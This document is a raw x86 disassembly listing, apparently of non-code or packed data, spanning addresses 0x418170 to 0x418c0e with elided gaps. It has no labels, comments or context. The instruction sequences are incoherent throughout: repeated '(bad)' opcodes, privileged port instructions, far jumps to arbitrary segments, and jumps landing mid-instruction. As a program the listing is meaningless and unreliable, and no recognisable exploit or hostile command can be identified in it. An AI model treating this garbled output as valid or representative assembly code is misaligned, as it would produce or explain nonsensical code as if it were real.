  418170:	fiadd  DWORD PTR [eax]
  418172:	imul   ebx,DWORD PTR [esi-0x183ddd13],0x3d
  418179:	xchg   edi,eax
  41817a:	xchg   ecx,eax
  41817b:	add    bh,BYTE PTR [edi+0x41d25032]
  418181:	mov    ebx,fs
  418183:	xchg   ebx,eax
  418184:	popf   
  418185:	test   eax,0x34ce8139
  41818a:	push   edx
  41818b:	mov    esi,0x51ad4186
  418190:	fwait
  418191:	adc    bh,BYTE PTR es:[esi+0x68]
  418195:	lahf   
  418196:	nop
  418197:	push   ss
  418198:	or     eax,0x8f678946
  41819d:	jge    0x4181af
  41819f:	add    dh,dh
  4181a1:	leave  
  4181a2:	addr16 pop es
  4181a4:	pop    ss
  4181a5:	aad    0xa4
  4181a7:	push   cs
  4181a8:	push   edi
  4181a9:	inc    eax
  4181aa:	xor    al,0x9e
  4181ac:	js     0x4181b9
  4181ae:	icebp  
  4181af:	outs   dx,DWORD PTR ds:[esi]
  4181b0:	out    0x1,eax
  4181b2:	push   es
  4181b3:	sbb    edi,DWORD PTR [ecx-0x46]
  4181b6:	cwde   
  4181b7:	or     al,bh
  4181b9:	adc    eax,0xbf7938ce
  4181be:	or     al,0xf3
  4181c0:	data16 aad 0x4c
  4181c3:	pusha  
  4181c4:	mov    BYTE PTR [ebx],al
  4181c6:	jo     0x4181d3
  4181c8:	xlat   BYTE PTR ds:[ebx]
  4181c9:	fist   WORD PTR [edi+0xd]
  4181cc:	inc    ebx
  4181cd:	mov    dh,0x91
  4181cf:	pop    esi
  4181d0:	push   esi
  4181d1:	cmp    dl,BYTE PTR [eax]
  4181d3:	inc    edx
  4181d4:	repnz (bad) [ebp-0x17]
  4181d8:	and    DWORD PTR ds:0xffe076d1,ecx
  4181de:	je     0x4181fd
  4181e0:	je     0x418197
  4181e2:	imul   edx,ebp,0xd4ff82e7
  4181e8:	push   esp
  4181e9:	xor    bh,BYTE PTR [ebp+ebx*2-0x704963bf]
  4181f0:	adc    al,0x88
  4181f2:	sbb    BYTE PTR [edx+0xc],bh
  4181f5:	repz sub ch,BYTE PTR ds:0x327c1a4a
  4181fc:	jmp    0x4181c1
  4181fe:	outs   dx,BYTE PTR ds:[esi]
  4181ff:	cmp    ch,BYTE PTR [edx]
  418201:	push   edi
  418202:	lea    edi,[esi+0x631a7cc5]
  418208:	push   esi
  418209:	ss pop esi
  41820b:	out    0x26,eax
  41820d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41820e:	push   esp
  41820f:	adc    ax,0x0
	...
  418273:	add    BYTE PTR [edi],dh
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x7cb2b8d6
  418282:	sub    bl,BYTE PTR [ebp+0xffbd]
  418288:	add    eax,0xac000001
  41828d:	jmp    0x2a113a72
  418292:	xor    al,0xf8
  418294:	cs push 0x32
  418297:	ret    
  418298:	inc    ecx
  418299:	mov    BYTE PTR [ecx],ah
  41829b:	mov    bh,0xe4
  41829d:	or     DWORD PTR [esi],0x15742dc9
  4182a3:	imul   ecx,DWORD PTR ds:0xda657911,0x39
  4182aa:	xchg   ebx,eax
  4182ab:	xlat   BYTE PTR ds:[ebx]
  4182ac:	and    eax,0x1dcd84d4
  4182b1:	mov    es,WORD PTR [edi+0x6d955fa0]
  4182b7:	xor    DWORD PTR [esi-0xf6fb974],eax
  4182bd:	mov    ah,0x69
  4182bf:	adc    DWORD PTR [esi-0x4e],ecx
  4182c2:	mov    esp,0xb6f4e8d4
  4182c7:	or     DWORD PTR [ebp+0x3b5eaee3],0xffffffa0
  4182ce:	stos   DWORD PTR es:[edi],eax
  4182cf:	push   esp
  4182d0:	adc    al,dh
  4182d2:	xor    ah,BYTE PTR [ebx+0x51]
  4182d5:	inc    edx
  4182d6:	loope  0x418329
  4182d8:	fiadd  DWORD PTR [edx-0x33]
  4182db:	dec    edx
  4182dc:	retf   0x929b
  4182df:	jge    0x41826e
  4182e1:	sub    ebp,DWORD PTR [esi]
  4182e3:	out    0xfa,eax
  4182e5:	sbb    edx,esp
  4182e7:	jmp    0x4a99:0x49ddc591
  4182ee:	add    dh,BYTE PTR [ebp-0x6afa02ca]
  4182f4:	pop    eax
  4182f5:	add    BYTE PTR [edi-0x5e64a87d],al
  4182fb:	pop    eax
  4182fc:	cwde   
  4182fd:	ror    BYTE PTR [edi-0x3132f74f],cl
  418303:	push   esi
  418304:	aam    0x9c
  418306:	fstenv [edx+ebp*4-0x6f]
  41830b:	stos   BYTE PTR es:[edi],al
  41830c:	popf   
  41830d:	aaa    
  41830e:	add    ch,BYTE PTR [ecx]
  418310:	scas   eax,DWORD PTR es:[edi]
  418311:	inc    edx
  418312:	jb     0x418322
  418314:	fwait
  418315:	out    0x1c,al
  418317:	inc    esp
  418318:	lock test al,0xc0
  41831b:	popa   
  41831c:	or     eax,DWORD PTR [esi]
  41831e:	jne    0x4182c5
  418320:	sub    al,BYTE PTR [edx+0x1e87153]
  418326:	repnz in al,0x19
  418329:	xchg   ebx,eax
  41832a:	int3   
  41832b:	ins    BYTE PTR es:[edi],dx
  41832c:	popf   
  41832d:	and    eax,0x373d3380
  418332:	pop    ss
  418333:	jbe    0x418365
  418335:	jmp    0x57db42f2
  41833a:	add    cl,BYTE PTR ds:0xf83d7eb2
  418340:	cdq    
  418341:	enter  0xff41,0x8c
  418345:	cmc    
  418346:	push   0x41693a50
  41834b:	lock mul dl
  41834e:	mov    dh,0x8f
  418350:	xchg   DWORD PTR [esi+0x18],esp
  418353:	and    DWORD PTR [esp+edx*4-0x68],eax
  418357:	scas   eax,DWORD PTR es:[edi]
  418358:	sahf   
  418359:	shl    bh,1
  41835b:	ins    BYTE PTR es:[edi],dx
  41835c:	jge    0x4183d3
  41835e:	cmp    al,0x28
  418360:	ins    DWORD PTR es:[edi],dx
  418361:	xlat   BYTE PTR ds:[ebx]
  418362:	xchg   DWORD PTR [ebx+0x4],ecx
  418365:	xor    BYTE PTR [ebp-0x7f798a5e],cl
  41836b:	mov    eax,ds:0xb11c8c8a
  418370:	pop    ss
  418371:	add    eax,DWORD PTR [ebx+edi*8]
  418374:	lods   eax,DWORD PTR ds:[esi]
  418375:	dec    ebp
  418376:	out    dx,al
  418377:	inc    ebp
  418378:	mov    bl,0x6a
  41837a:	scas   eax,DWORD PTR es:[edi]
  41837b:	imul   eax,DWORD PTR ds:0x75fdcd97,0xbf95c0e8
  418385:	cmp    al,BYTE PTR [ecx-0x65]
  418388:	fsub   QWORD PTR [bx-0x20e0]
  41838d:	mov    esp,0xb71135
	...
  4183f2:	add    BYTE PTR [eax],al
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	add    dh,BYTE PTR [esi+0xc29cb7]
  418406:	add    DWORD PTR [eax],eax
  418408:	add    eax,0x1e000001
  41840d:	stos   DWORD PTR es:[edi],eax
  41840e:	mov    ecx,0xdf877325
  418413:	clc    
  418414:	popf   
  418415:	and    esp,edx
  418417:	je     0x4183e6
  418419:	aad    0x7e
  41841b:	cmp    al,0x71
  41841d:	es nop
  41841f:	pop    ebx
  418420:	aas    
  418421:	(bad)  
  418423:	loopne 0x418430
  418425:	nop
  418426:	cmp    DWORD PTR [ebp+0x57],edx
  418429:	lea    ebp,[edx-0x542f8629]
  41842f:	or     bh,BYTE PTR [esi]
  418431:	sub    edx,0x16
  418434:	in     eax,dx
  418435:	jle    0x418445
  418437:	pop    ds
  418438:	jbe    0x418444
  41843a:	xchg   ebp,eax
  41843b:	lods   eax,DWORD PTR ds:[esi]
  41843c:	cmp    BYTE PTR [edx-0x7cf4b2b1],0xf
  418443:	js     0x41849a
  418445:	sub    DWORD PTR [ebx-0x754a923f],0x5ff09037
  41844f:	jb     0x41840e
  418451:	push   ecx
  418452:	fstp   DWORD PTR [edi+0xd]
  418455:	and    al,0xdd
  418457:	aam    0xe1
  418459:	fcomp  st(6)
  41845b:	sub    BYTE PTR [ebx-0x45],0x79
  41845f:	xchg   ebp,eax
  418460:	jge    0x4184ca
  418462:	xor    al,0x71
  418464:	div    BYTE PTR [ecx]
  418466:	shl    DWORD PTR [ebp-0x79],cl
  418469:	popf   
  41846a:	inc    edx
  41846b:	mov    eax,ds:0x5b882e13
  418470:	mov    WORD PTR [ebp+0x4ba9d923],gs
  418476:	pop    edx
  418477:	mov    ecx,?
  418479:	call   0x710b7050
  41847e:	inc    esp
  41847f:	daa    
  418480:	shl    edi,cl
  418482:	jne    0x418487
  418484:	mov    eax,DWORD PTR [edi-0x2fa0a45c]
  41848a:	std    
  41848b:	fbld   TBYTE PTR [ecx-0x4632cf75]
  418491:	jge    0x418439
  418493:	adc    BYTE PTR [ecx-0x69b9e0d],0xa9
  41849a:	into   
  41849b:	adc    al,0x69
  41849d:	pop    ss
  41849e:	fidivr DWORD PTR [ecx-0x171a8fb7]
  4184a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184a5:	mov    dh,0x2a
  4184a7:	adc    bh,BYTE PTR [edx]
  4184a9:	inc    ecx
  4184aa:	and    eax,0xd67b352
  4184af:	sub    al,0x41
  4184b1:	jae    0x41844d
  4184b3:	or     al,BYTE PTR [eax+esi*1-0x40647494]
  4184ba:	test   eax,0xd320cced
  4184bf:	dec    eax
  4184c0:	fstp   TBYTE PTR [esi+eax*1+0x40]
  4184c4:	mov    eax,DWORD PTR [ebx]
  4184c6:	icebp  
  4184c7:	pop    es
  4184c8:	push   cs
  4184c9:	adc    al,0x25
  4184cb:	mov    al,BYTE PTR [edi+0x7e]
  4184ce:	idiv   DWORD PTR [ecx]
  4184d0:	sub    DWORD PTR [edx+0x41],0x8a4fc1cf
  4184d7:	out    0xd2,al
  4184d9:	mov    DWORD PTR [eax+ebx*8],esp
  4184dc:	sbb    al,0x5d
  4184de:	mov    eax,0x440af349
  4184e3:	sub    edi,DWORD PTR [ebp+edi*1-0x55]
  4184e7:	inc    esp
  4184e8:	push   edx
  4184e9:	jg     0x418493
  4184eb:	push   ecx
  4184ec:	dec    ecx
  4184ed:	inc    esi
  4184ee:	pop    esi
  4184ef:	and    DWORD PTR [edx-0x68],0xd240be5
  4184f6:	mov    esp,0x441841ec
  4184fb:	ror    BYTE PTR [ecx],1
  4184fd:	mov    edi,DWORD PTR [ebx-0xc]
  418500:	xor    al,0xeb
  418502:	sbb    si,WORD PTR [ebp-0x50]
  418506:	push   0x9d187fc9
  41850b:	and    al,0x6d
  41850d:	mov    dh,0xa
  41850f:	jl     0x4184d8
	...
  418571:	add    BYTE PTR [eax],al
  418573:	add    BYTE PTR [ecx-0x7],al
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	(bad)  
  418581:	sbb    al,0x5b
  418583:	in     eax,0xc7
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR ds:0x7000001,al
  41858d:	xor    BYTE PTR [ecx-0x67],dh
  418590:	add    ch,BYTE PTR [ebp-0x11]
  418593:	arpl   WORD PTR [ecx-0x19],dx
  418596:	xor    eax,0xc1ddad6a
  41859b:	arpl   bx,sp
  41859d:	ror    BYTE PTR [esi],0x5b
  4185a0:	aad    0x71
  4185a2:	je     0x4185e2
  4185a4:	adc    dl,ah
  4185a6:	jecxz  0x418611
  4185a8:	adc    edi,eax
  4185aa:	in     eax,dx
  4185ab:	and    DWORD PTR [ebx-0x6a92acc5],esp
  4185b1:	in     eax,0xde
  4185b3:	add    eax,0xcecd7317
  4185b8:	jle    0x4185c5
  4185ba:	add    bp,bp
  4185bd:	iret   
  4185be:	enter  0xdb6d,0xfe
  4185c2:	ds es push eax
  4185c5:	mov    eax,0xadb499ce
  4185ca:	and    dh,BYTE PTR [eax-0x5f]
  4185cd:	dec    edi
  4185ce:	sub    BYTE PTR [edi],dl
  4185d0:	or     eax,0x3ef834ff
  4185d5:	iret   
  4185d6:	push   ebp
  4185d7:	ret    
  4185d8:	mov    ebx,DWORD PTR [edx]
  4185da:	ins    DWORD PTR es:[edi],dx
  4185db:	or     DWORD PTR [edx-0x63],ebp
  4185de:	adc    eax,0xbab20469
  4185e3:	stos   DWORD PTR es:[edi],eax
  4185e4:	test   ecx,0xd948ca79
  4185ea:	shl    DWORD PTR [ebx-0x60aaa7ed],1
  4185f0:	jg     0x418648
  4185f2:	sbb    eax,0x1f9eada5
  4185f7:	dec    ecx
  4185f8:	outs   dx,DWORD PTR ds:[esi]
  4185f9:	push   esp
  4185fa:	push   ebx
  4185fb:	in     eax,0xfa
  4185fd:	daa    
  4185fe:	scas   al,BYTE PTR es:[edi]
  4185ff:	enter  0x137d,0x4b
  418603:	push   esp
  418604:	scas   eax,DWORD PTR es:[edi]
  418605:	xor    al,0x95
  418607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418608:	rol    BYTE PTR ds:0x2efc3c02,cl
  41860e:	inc    eax
  41860f:	mov    eax,0x1ceaa412
  418614:	xchg   ebp,ecx
  418616:	outs   dx,DWORD PTR ds:[si]
  418618:	lods   al,BYTE PTR ds:[esi]
  418619:	pusha  
  41861a:	adc    edi,DWORD PTR [eax]
  41861c:	loop   0x418657
  41861e:	jns    0x41869b
  418620:	ja     0x4185da
  418622:	xchg   esp,eax
  418623:	mov    dl,0xf2
  418625:	add    ah,BYTE PTR [ebp-0xa]
  418628:	sbb    DWORD PTR [edi],esi
  41862a:	aad    0xf3
  41862c:	(bad)  
  41862d:	mov    DWORD PTR [eax],eax
  41862f:	and    al,BYTE PTR [edx+0x6b3a02b2]
  418635:	sbb    BYTE PTR ds:0xd265632e,cl
  41863b:	jp     0x418604
  41863d:	jecxz  0x418613
  41863f:	in     eax,dx
  418640:	sub    BYTE PTR [edx+0x2e862ac7],0x48
  418647:	repnz cmp BYTE PTR [edi+0x4779d537],bl
  41864e:	jo     0x41863b
  418650:	ret    
  418651:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418653:	in     al,dx
  418654:	sub    eax,0xf4bf42fc
  418659:	fist   WORD PTR [ecx+0x6a45783]
  41865f:	test   eax,0x7b66fe5f
  418664:	sbb    BYTE PTR [ebp*1+0x556122d2],0xfd
  41866c:	sub    edx,ecx
  41866e:	mov    es,WORD PTR ds:0xc320f43e
  418674:	pop    eax
  418675:	inc    esi
  418676:	in     eax,0x69
  418678:	and    bh,al
  41867a:	cmc    
  41867b:	enter  0xc195,0xa4
  41867f:	mov    ah,0xd1
  418681:	dec    edx
  418682:	sub    al,0x26
  418684:	mov    dh,BYTE PTR [edx-0x372ee29b]
  41868a:	xor    edi,DWORD PTR [ecx+0x28]
  41868d:	dec    esi
  41868e:	push   ebp
  41868f:	and    bl,dh
	...
  4186f1:	add    BYTE PTR [eax],al
  4186f3:	add    BYTE PTR [ebx-0x44c35fd8],dl
  4186f9:	mov    esp,0x8d0caf9f
  4186fe:	cmp    edx,edx
  418700:	adc    DWORD PTR [edi+0x2ccdfa9],ecx
  418706:	add    DWORD PTR [eax],eax
  418708:	add    eax,0x98000001
  41870d:	or     cl,dl
  41870f:	dec    ecx
  418710:	imul   edx,DWORD PTR [ebx+0x338d6aff],0xfffffff1
  418717:	push   ds
  418718:	dec    ebx
  418719:	push   edi
  41871a:	push   ebx
  41871b:	scas   eax,DWORD PTR es:[edi]
  41871c:	xchg   ebp,eax
  41871d:	mov    edi,0x35d85aac
  418722:	idiv   BYTE PTR [ebx+0x37]
  418725:	adc    eax,0x62989f06
  41872a:	rcr    DWORD PTR [edi-0x3a],1
  41872d:	push   ebp
  41872e:	cs mov ch,0x16
  418731:	or     al,0x11
  418733:	aam    0xea
  418735:	inc    ebx
  418736:	lock xor edx,DWORD PTR [edi]
  418739:	test   edx,eax
  41873b:	lds    esi,FWORD PTR [ebx-0x4e16a508]
  418741:	push   0x4bc237b3
  418746:	and    ecx,DWORD PTR [esi]
  418748:	inc    edx
  418749:	or     al,BYTE PTR [ebp-0x5f943017]
  41874f:	lock cdq 
  418751:	pushf  
  418752:	gs xchg edx,eax
  418754:	jnp    0x4186e6
  418756:	inc    ebx
  418757:	lea    esi,ds:[esi+eiz*2]
  41875b:	xchg   edi,eax
  41875c:	(bad)  
  41875d:	rol    al,cl
  41875f:	cwde   
  418760:	inc    eax
  418761:	mov    esp,0x821a21c7
  418766:	mov    eax,ds:0x4eb6de51
  41876b:	cld    
  41876c:	pusha  
  41876d:	in     al,dx
  41876e:	mov    cl,0xb9
  418770:	adc    eax,0xdd4a4460
  418775:	das    
  418776:	sbb    DWORD PTR [edx+ecx*8+0x1a10fb92],edx
  41877d:	dec    ebx
  41877e:	mov    BYTE PTR [eax],ch
  418780:	and    BYTE PTR [eax],ch
  418782:	mov    eax,ds:0xc76a582e
  418787:	shr    BYTE PTR [ebx+0x4db7d15d],1
  41878d:	dec    ecx
  41878e:	sub    ah,ch
  418790:	adc    dh,BYTE PTR [esi]
  418792:	mov    ebx,0x64a0254d
  418797:	test   eax,0xd4b60f73
  41879c:	xchg   ebx,eax
  41879d:	sub    BYTE PTR [esi+0x6e8b8eb8],0xf3
  4187a4:	or     BYTE PTR [ebx+0x75],0xcc
  4187a8:	rol    BYTE PTR ds:0xd7a60fa7,1
  4187ae:	pop    esp
  4187af:	(bad)  
  4187b0:	sbb    al,0x73
  4187b2:	or     dl,BYTE PTR [edx]
  4187b4:	jl     0x4187e0
  4187b6:	xchg   esi,eax
  4187b7:	cmp    dh,al
  4187b9:	addr16 xchg ebp,eax
  4187bb:	(bad)  
  4187bd:	jne    0x4187b7
  4187bf:	inc    ebp
  4187c0:	ret    
  4187c1:	in     eax,dx
  4187c2:	jb     0x418812
  4187c4:	and    ah,BYTE PTR [esi-0x64]
  4187c7:	add    edx,DWORD PTR [eax+0x3ae9e99f]
  4187cd:	jge    0x4187a2
  4187cf:	push   edx
  4187d0:	pop    ss
  4187d1:	retf   0x43c6
  4187d4:	call   0xef45:0x6a26d21a
  4187db:	cmp    esi,0x9d587644
  4187e1:	mov    ebp,0x4c9ab753
  4187e6:	and    dh,BYTE PTR [ecx-0x6a77b8d2]
  4187ec:	rol    BYTE PTR [esi-0x446c7fd5],cl
  4187f2:	inc    ecx
  4187f3:	ins    BYTE PTR es:[edi],dx
  4187f4:	or     ecx,DWORD PTR [ecx-0x70]
  4187f7:	and    eax,DWORD PTR [eax-0x6bbb3281]
  4187fd:	mov    ch,0xd1
  4187ff:	lea    edx,[ebp-0x7f]
  418802:	or     eax,0xfcd830d3
  418807:	sub    ebx,ecx
  418809:	or     ah,BYTE PTR [eax-0x4b]
  41880c:	ins    BYTE PTR es:[edi],dx
  41880d:	(bad)  [esi-0x38]
  418810:	test   BYTE PTR [eax],al
	...
  418872:	add    BYTE PTR [eax],al
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi-0x7d63c533]
  418881:	mov    cs,WORD PTR [esp+eax*4-0x2f]
  418885:	add    eax,DWORD PTR [ecx]
  418887:	add    BYTE PTR ds:0x6f000001,al
  41888d:	out    0x8d,eax
  41888f:	mov    WORD PTR [ecx+0x6b877b52],ds
  418895:	mov    dl,0x9
  418897:	shr    BYTE PTR [edi+0x41],1
  41889a:	int3   
  41889b:	shl    BYTE PTR [eax+0x18b1949e],1
  4188a1:	shl    BYTE PTR [ecx+0x12],0x28
  4188a5:	imul   ecx,DWORD PTR [edx+0x11],0xffffffa1
  4188a9:	pop    esp
  4188aa:	gs retf 0x50ae
  4188ae:	mov    edi,ecx
  4188b0:	xchg   esp,eax
  4188b1:	inc    esi
  4188b2:	dec    esp
  4188b3:	mov    edi,0xeecde241
  4188b8:	cmc    
  4188b9:	adc    esi,DWORD PTR [edi-0x2b]
  4188bc:	shr    BYTE PTR [ecx+0x4eb48bd1],cl
  4188c2:	push   0xaee85602
  4188c7:	pushf  
  4188c8:	lock sub bh,al
  4188cb:	push   es
  4188cc:	fs inc esp
  4188ce:	inc    ecx
  4188cf:	retf   0x950e
  4188d2:	or     al,0x52
  4188d4:	retf   0xe374
  4188d7:	int3   
  4188d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188d9:	sbb    al,0xa6
  4188db:	hlt    
  4188dc:	cld    
  4188dd:	in     al,dx
  4188de:	(bad)  
  4188e0:	(bad)  
  4188e1:	sti    
  4188e2:	add    ax,0xa7b8
  4188e6:	jl     0x418944
  4188e8:	clc    
  4188e9:	add    BYTE PTR fs:[edi-0x32],cl
  4188ed:	mov    edi,0x1bd092a2
  4188f2:	stos   DWORD PTR es:[edi],eax
  4188f3:	popa   
  4188f4:	xlat   BYTE PTR ds:[ebx]
  4188f5:	mov    ch,0xa9
  4188f7:	sbb    eax,DWORD PTR [eax]
  4188f9:	repnz adc esi,ebx
  4188fc:	pop    edx
  4188fd:	fsub   DWORD PTR [eax+0x25]
  418900:	das    
  418901:	std    
  418902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418903:	ret    0x88aa
  418906:	xchg   ecx,eax
  418907:	cwde   
  418908:	lods   eax,DWORD PTR ds:[esi]
  418909:	cmp    esi,edx
  41890b:	and    cl,BYTE PTR [esi]
  41890d:	mov    bl,0x15
  41890f:	mov    DWORD PTR ds:0x1fe6ff31,ebp
  418915:	add    eax,0x8a26df92
  41891a:	xchg   edx,eax
  41891b:	add    dl,BYTE PTR [edi-0x4b36e787]
  418921:	mov    edx,0x409784a9
  418926:	call   0x620cfdce
  41892b:	pop    ecx
  41892c:	jmp    0x7fba8fa1
  418931:	loope  0x4188db
  418933:	and    esi,DWORD PTR [bp+di+0x7afd]
  418938:	pop    esp
  418939:	adc    eax,0x129106c8
  41893e:	cmp    eax,0x73a8247e
  418943:	inc    esi
  418945:	hlt    
  418946:	jmp    edi
  418948:	shl    BYTE PTR [edx+0x4e],cl
  41894b:	mov    ebp,0x76c42878
  418950:	or     cl,BYTE PTR [ebp+0x169a7bdc]
  418956:	pop    es
  418957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418958:	stos   DWORD PTR es:[edi],eax
  418959:	and    cl,BYTE PTR [esi]
  41895b:	imul   bl
  41895d:	test   BYTE PTR [ecx+0x7b],dh
  418960:	pop    ds
  418961:	cmp    DWORD PTR [ecx],edx
  418963:	cmp    ax,0x1f0b
  418967:	sub    al,0xf3
  418969:	shl    BYTE PTR [eax-0x46],1
  41896c:	cld    
  41896d:	mov    al,ds:0x9896b060
  418972:	push   esp
  418973:	push   edx
  418974:	cmc    
  418975:	shr    DWORD PTR [ebx],0xf7
  418978:	in     al,0xde
  41897a:	jno    0x418928
  41897c:	or     cl,bl
  41897e:	imul   ecx,DWORD PTR [esi],0x97c51767
  418984:	add    al,0x19
  418986:	sub    ebx,DWORD PTR [ebx]
  418988:	or     cl,BYTE PTR [ebp+0x15]
  41898b:	ja     0x418a08
  41898d:	push   esi
  41898e:	js     0x418961
  418990:	adc    DWORD PTR [eax],eax
	...
  4189f2:	add    BYTE PTR [eax],al
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xfc9e4e69
  418a03:	adc    dh,0x4
  418a06:	add    DWORD PTR [eax],eax
  418a08:	add    eax,0x33000001
  418a0d:	call   0xce37:0x785cda34
  418a14:	ss mov ebx,0xace92055
  418a1a:	mov    ebx,0x681b6283
  418a1f:	shr    BYTE PTR [edi+0x40],cl
  418a22:	mov    eax,ds:0xcbd3356c
  418a27:	les    ebp,FWORD PTR [ecx]
  418a29:	lods   eax,DWORD PTR ds:[esi]
  418a2a:	data16 lahf 
  418a2c:	test   BYTE PTR [edx+eax*1],bl
  418a2f:	sbb    bh,BYTE PTR [ebp+0x37]
  418a32:	and    eax,0xc06c5460
  418a37:	(bad)  
  418a38:	lea    ebx,[edi+0x58]
  418a3b:	xor    dh,BYTE PTR [esi-0x22b6e6d9]
  418a41:	push   ebp
  418a42:	pop    esp
  418a43:	xor    eax,0x5039990c
  418a48:	mov    edi,0x5c055a87
  418a4d:	cmp    cl,bh
  418a4f:	shl    DWORD PTR [ebx+0x1b],0x83
  418a53:	aaa    
  418a54:	sub    al,0xe
  418a56:	cmp    eax,0xdfc0bdbd
  418a5b:	or     eax,0x931b235a
  418a60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a61:	and    DWORD PTR [ebx+0x1247fd27],esi
  418a67:	sbb    al,0xd0
  418a69:	xor    eax,0xd20d4e3b
  418a6e:	shl    esp,1
  418a70:	inc    edi
  418a71:	cs addr16 mov ch,ah
  418a75:	mov    bl,0x20
  418a77:	int3   
  418a78:	dec    ecx
  418a79:	or     BYTE PTR [ecx],0xf2
  418a7c:	jmp    0x418a82
  418a7e:	adc    esi,DWORD PTR [eax-0x7d2debb2]
  418a84:	(bad)  
  418a85:	mov    ds:0xd103d50e,al
  418a8a:	push   ss
  418a8b:	or     al,0xa7
  418a8d:	sub    BYTE PTR [ebx],dh
  418a8f:	jge    0x418afc
  418a91:	imul   esp,DWORD PTR [ebx],0x48720536
  418a97:	add    eax,0x46a2e87e
  418a9c:	mov    al,ds:0xc90ef034
  418aa1:	pop    eax
  418aa2:	pushf  
  418aa3:	pop    ebp
  418aa4:	and    DWORD PTR [eax-0x48],ecx
  418aa7:	dec    ebp
  418aa8:	cld    
  418aa9:	loope  0x418aa1
  418aab:	rcl    DWORD PTR [ebx+edx*8+0x78],0xb1
  418ab0:	mov    al,ds:0x8e11736a
  418ab5:	repnz pop esi
  418ab7:	pop    edi
  418ab8:	out    dx,eax
  418ab9:	xor    al,dl
  418abb:	cdq    
  418abc:	in     eax,dx
  418abd:	(bad)  
  418abe:	pop    esi
  418abf:	fstp   TBYTE PTR [esi+0x37]
  418ac2:	push   esi
  418ac3:	hlt    
  418ac4:	mov    ebp,0x93211cc2
  418ac9:	ins    BYTE PTR es:[edi],dx
  418aca:	mov    bl,0xf7
  418acc:	ins    BYTE PTR es:[edi],dx
  418acd:	add    edi,DWORD PTR [ebp+0x40cd1ef0]
  418ad3:	ss pushf 
  418ad5:	cmc    
  418ad6:	xchg   ebx,eax
  418ad7:	stos   BYTE PTR es:[edi],al
  418ad8:	push   eax
  418ad9:	add    dl,BYTE PTR [ecx]
  418adb:	fwait
  418adc:	mov    ch,0x6e
  418ade:	sub    eax,0xc545a626
  418ae3:	ja     0x418b01
  418ae5:	xor    BYTE PTR [ecx+0x5e97e533],bh
  418aeb:	push   0xad2f38a9
  418af0:	cld    
  418af1:	cmp    BYTE PTR [ebx-0x3a],al
  418af4:	push   0x31
  418af6:	xchg   ebx,eax
  418af7:	sti    
  418af8:	and    DWORD PTR [esi+ebx*2],esi
  418afb:	sbb    eax,DWORD PTR [edi+0x65]
  418afe:	pop    ebp
  418aff:	ja     0x418b04
  418b01:	xchg   ebx,eax
  418b02:	dec    ebx
  418b03:	mov    ds:0x3039d831,eax
  418b08:	push   0xffffffd6
  418b0a:	into   
  418b0b:	push   ebp
  418b0c:	and    esp,DWORD PTR [ecx+0x9297e7]
	...
  418b72:	add    BYTE PTR [eax],al
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x86
  418b81:	into   
  418b82:	mov    eax,0x105db
  418b88:	add    eax,0xe6000001
  418b8d:	pop    ebx
  418b8e:	mov    bh,0xf6
  418b90:	scas   eax,DWORD PTR es:[edi]
  418b91:	mov    cl,0xa1
  418b93:	xor    DWORD PTR [edi-0x50],ecx
  418b96:	loope  0x418b2c
  418b98:	xchg   DWORD PTR [esi],esp
  418b9a:	fcmovu st,st(0)
  418b9c:	sub    ch,cl
  418b9e:	mov    eax,ds:0x29c2d409
  418ba3:	add    al,BYTE PTR [edi+0x1]
  418ba6:	add    BYTE PTR [ecx-0x7e8dabe3],bl
  418bac:	iret   
  418bad:	push   ebp
  418bae:	mov    ss,WORD PTR [eax+0x7e]
  418bb1:	push   edx
  418bb2:	rol    DWORD PTR [eax+0x74b03ea],0xea
  418bb9:	jbe    0x418c2e
  418bbb:	hlt    
  418bbc:	div    DWORD PTR [edi]
  418bbe:	or     al,0x25
  418bc0:	sub    DWORD PTR [edx],ebp
  418bc2:	aaa    
  418bc3:	cmp    ah,al
  418bc5:	dec    esp
  418bc6:	mov    bh,0x76
  418bc8:	call   0x7bc8:0xc8c6ef19
  418bcf:	mov    cl,0xfa
  418bd1:	fisubr DWORD PTR [ecx-0x44]
  418bd4:	adc    edx,esi
  418bd6:	mov    ch,0xf5
  418bd8:	xchg   ebp,eax
  418bd9:	call   0xef54:0x1ab6bbf3
  418be0:	cmp    al,0x40
  418be2:	sub    dh,dl
  418be4:	test   eax,0x8afef3cb
  418be9:	fs aad 0x97
  418bec:	(bad)  
  418bed:	popa   
  418bee:	adc    BYTE PTR [eax-0x62e42425],0x55
  418bf5:	or     DWORD PTR [esi],ecx
  418bf7:	mov    cs,WORD PTR [edx+0x2c]
  418bfa:	jmp    FWORD PTR [ebp+0x26]
  418bfd:	add    edi,DWORD PTR [ecx*1-0x248dd3d0]
  418c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c05:	leave  
  418c06:	and    ah,BYTE PTR [ebp+ebx*4+0x5d]
  418c0a:	xor    cl,bl
  418c0c:	mov    edi,fs
  418c0e:	lods   eax,DWORD PTR ds:[esi]
